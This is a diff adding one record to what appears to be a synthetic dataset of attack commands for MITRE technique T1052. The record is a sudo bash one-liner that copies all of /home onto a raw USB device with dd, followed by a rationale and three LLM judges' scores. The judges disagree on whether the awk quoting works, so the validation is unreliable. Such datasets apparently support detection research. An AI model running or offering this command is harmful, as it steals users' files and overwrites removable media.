@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UDEV=$(lsblk -o NAME,TRAN -nr | awk \"$2==\\\"usb\\\"{print \\\"/dev/\\\"$1}\" | head -n1); tar -cf - /home | gzip -9 | dd of=\"$UDEV\" bs=4M conv=fsync status=none'",
+  "explanation": "Directly writes a gzip-compressed tar of /home to the raw USB block device using dd, bypassing the filesystem to store data on physical media.",
+  "rationale_steps": [
+    "Locate the physical USB device node.",
+    "Create a tar stream of user data and compress with gzip.",
+    "Write the compressed stream directly to the USB device using dd.",
+    "Avoid network paths; operate entirely on local block devices."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-f65df58f",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Shell syntax is well-formed with balanced quotes and valid pipelines/flags, making it parseable as written.",
+        "semantic_score": 3,
+        "semantic_justification": "The awk program uses unescaped $1/$2 inside double quotes, causing shell expansion and likely yielding no valid USB device (empty or invalid UDEV) so dd fails, though the approach would implement T1052 if corrected.",
+        "combined_score": 4.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T07:34:50.678292Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, variable assignment, command substitution, piping, and redirection syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a USB device, compressing the entire /home directory, and writing it directly to the physical USB medium using dd, bypassing normal filesystem operations.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:34:53.273382Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, valid flag formats, proper command separators, and correct escaping for the nested `awk` script within the `bash -c` context.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves its claimed intent by identifying a USB device, creating a gzip-compressed tar archive of /home, and directly writing it to the raw USB block device using `dd`, perfectly aligning with T1052 Exfiltration Over Physical Medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:35:09.406710Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
